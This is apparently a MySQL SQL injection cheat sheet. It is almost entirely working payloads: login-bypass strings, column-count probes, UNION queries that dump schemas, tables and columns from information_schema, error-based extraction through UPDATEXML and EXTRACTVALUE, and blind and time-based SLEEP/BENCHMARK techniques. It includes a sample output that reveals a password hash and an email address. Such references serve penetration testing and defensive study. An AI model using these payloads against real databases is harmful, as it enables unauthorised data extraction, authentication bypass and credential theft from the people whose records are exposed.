

## MYSQL Default Databases

| Name               | Description                         |
| ------------------ | ----------------------------------- |
| mysql              | Requires root privileges            |
| information_schema | Available from version 5 and higher |

## MYSQL Comments

MySQL comments are annotations in SQL code that are ignored by the MySQL server during execution.

| Type                       | Description                       |
| -------------------------- | --------------------------------- |
| `#`                        | Hash comment                      |
| `/* MYSQL Comment */`      | C-style comment                   |
| `/*! MYSQL Special SQL */` | Special SQL                       |
| `/*!32302 10*/`            | Comment for MYSQL version 3.23.02 |
| `--`                       | SQL comment                       |
| `;%00`                     | Nullbyte                          |
| \`                         | Backtick                          |

## MYSQL Testing Injection

* **Strings**: Query like `SELECT * FROM Table WHERE id = 'FUZZ';`

    ```ps1
    ' False
    '' True
    " False
    "" True
    \ False
    \\ True
    ```

* **Numeric**: Query like `SELECT * FROM Table WHERE id = FUZZ;`

    ```ps1
    AND 1     True
    AND 0     False
    AND true True
    AND false False
    1-false     Returns 1 if vulnerable
    1-true     Returns 0 if vulnerable
    1*56     Returns 56 if vulnerable
    1*56     Returns 1 if not vulnerable
    ```

* **Login**: Query like `SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';`

    ```ps1
    ' OR '1
    ' OR 1 -- -
    " OR "" = "
    " OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ```

## MYSQL Union Based

### Detect Columns Number

To successfully perform a union-based SQL injection, an attacker needs to know the number of columns in the original query.

#### Iterative NULL Method

Systematically increase the number of columns in the `UNION SELECT` statement until the payload executes without errors or produces a visible change. Each iteration checks the compatibility of the column count.

```sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
```

#### ORDER BY Method

Keep incrementing the number until you get a `False` response. Even though `GROUP BY` and `ORDER BY` have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

| ORDER BY        | GROUP BY        | Result |
| --------------- | --------------- | ------ |
| `ORDER BY 1--+` | `GROUP BY 1--+` | True   |
| `ORDER BY 2--+` | `GROUP BY 2--+` | True   |
| `ORDER BY 3--+` | `GROUP BY 3--+` | True   |
| `ORDER BY 4--+` | `GROUP BY 4--+` | False  |

Since the result is false for `ORDER BY 4`, it means the SQL query is only having 3 columns.
In the `UNION` based SQL injection, you can `SELECT` arbitrary data to display on the page: `-1' UNION SELECT 1,2,3--+`.

Similar to the previous method, we can check the number of columns with one request if error showing is enabled.

```sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
```

#### LIMIT INTO Method

This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.

| Payload                      | Error                                                           |
| ---------------------------- | --------------------------------------------------------------- |
| `1' LIMIT 1,1 INTO @--+`     | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@--+`   | `The used SELECT statements have a different number of columns` |
| `1' LIMIT 1,1 INTO @,@,@--+` | `No error means query uses 3 columns`                           |

Since the result doesn't show any error it means the query uses 3 columns: `-1' UNION SELECT 1,2,3--+`.

### Extract Database With Information_Schema

This query retrieves the names of all schemas (databases) on the server.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
```

This query retrieves the names of all tables within a specified schema (the schema name is represented by PLACEHOLDER).

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER
```

This query retrieves the names of all columns in a specified table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...
```

This query aims to retrieve data from a specific table.

```sql
UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...
```

### Extract Columns Name Without Information_Schema

Method for `MySQL >= 4.1`.

| Payload                                                                   | Output                                 |
| ------------------------------------------------------------------------- | -------------------------------------- |
| `(1)and(SELECT * from db.users)=(1)`                                      | Operand should contain **4** column(s) |
| `1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)` | Column '**id**' cannot be null         |

Method for `MySQL 5`

| Payload                                                                  | Output                           |
| ------------------------------------------------------------------------ | -------------------------------- |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b)a`                | Duplicate column name '**id**'   |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a`      | Duplicate column name '**name**' |
| `UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a` | Data                             |

### Extract Data Without Columns Name

Extracting data from the 4th column without knowing its name.

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

Injection example inside the query `select author_id,title from posts where author_id=[INJECT_HERE]`

```sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
```

## MYSQL Error Based

| Name         | Payload                                                                                        |
| ------------ | ---------------------------------------------------------------------------------------------- |
| GTID_SUBSET  | `AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -`                                |
| JSON_KEYS    | `AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -` |
| EXTRACTVALUE | `AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -`                           |
| UPDATEXML    | `AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -`                        |
| EXP          | `AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -`              |
| OR           | `OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -`         |
| NAME_CONST   | `AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--`          |
| UUID_TO_BIN  | `AND UUID_TO_BIN(version())='1`                                                                |

### MYSQL Error Based - Basic

Works with `MySQL >= 4.1`

```sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
```

### MYSQL Error Based - UpdateXML Function

```sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
```

Shorter to read:

```sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
```

### MYSQL Error Based - Extractvalue Function

Works with `MySQL >= 5.1`

```sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
```

### MYSQL Error Based - NAME_CONST function (only for constants)

Works with `MySQL >= 5.0`

```sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
```

## MYSQL Blind

### MYSQL Blind With Substring Equivalent

| Function    | Example                        | Description                                                         |
| ----------- | ------------------------------ | ------------------------------------------------------------------- |
| `SUBSTR`    | `SUBSTR(version(),1,1)=5`      | Extracts a substring from a string (starting at any position)       |
| `SUBSTRING` | `SUBSTRING(version(),1,1)=5`   | Extracts a substring from a string (starting at any position)       |
| `RIGHT`     | `RIGHT(left(version(),1),1)=5` | Extracts a number of characters from a string (starting from right) |
| `MID`       | `MID(version(),1,1)=4`         | Extracts a substring from a string (starting at any position)       |
| `LEFT`      | `LEFT(version(),1)=4`          | Extracts a number of characters from a string (starting from left)  |

Examples of Blind SQL injection using `SUBSTRING` or another equivalent function:

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

### MYSQL Blind Using a Conditional Statement

* TRUE: `if @@version starts with a 5`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
    ```

* FALSE: `if @@version starts with a 4`:

    ```sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
    ```

### MYSQL Blind With MAKE_SET

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
```

### MYSQL Blind With LIKE

In MySQL, the `LIKE` operator can be used to perform pattern matching in queries. The operator allows the use of wildcard characters to match unknown or partial string values. This is especially useful in a blind SQL injection context when an attacker does not know the length or specific content of the data stored in the database.

Wildcard Characters in LIKE:

* **Percentage Sign** (`%`): This wildcard represents zero, one, or multiple characters. It can be used to match any sequence of characters.
* **Underscore** (`_`): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
```

### MySQL Blind with REGEXP

Blind SQL injection can also be performed using the MySQL `REGEXP` operator, which is used for matching a string against a regular expression. This technique is particularly useful when attackers want to perform more complex pattern matching than what the `LIKE` operator can offer.

| Payload                                                                | Description                         |
| ---------------------------------------------------------------------- | ----------------------------------- |
| `' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --` | Checking length                     |
| `' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --`   | Checking for the presence of digits |
| `' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --` | Checking for data starting by "a"   |

## MYSQL Time Based

The following SQL codes will delay the output from MySQL.

* MySQL 4/5 : [`BENCHMARK()`](https://dev.mysql.com/doc/refman/8.4/en/select-benchmarking.html)

    ```sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ```

* MySQL 5: [`SLEEP()`](https://dev.mysql.com/doc/refman/8.4/en/miscellaneous-functions.html#function_sleep)

    ```sql
    RLIKE SLEEP([SLEEPTIME])
    OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
    XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
    AND SLEEP(10)=0
    AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)
    ```

### Using SLEEP in a Subselect

Extracting the length of the data.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
```

Extracting the first character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
```

Extracting the second character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
```

Extracting the third character.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
```

Extracting column_name.

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

### Using Conditional Statements

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```
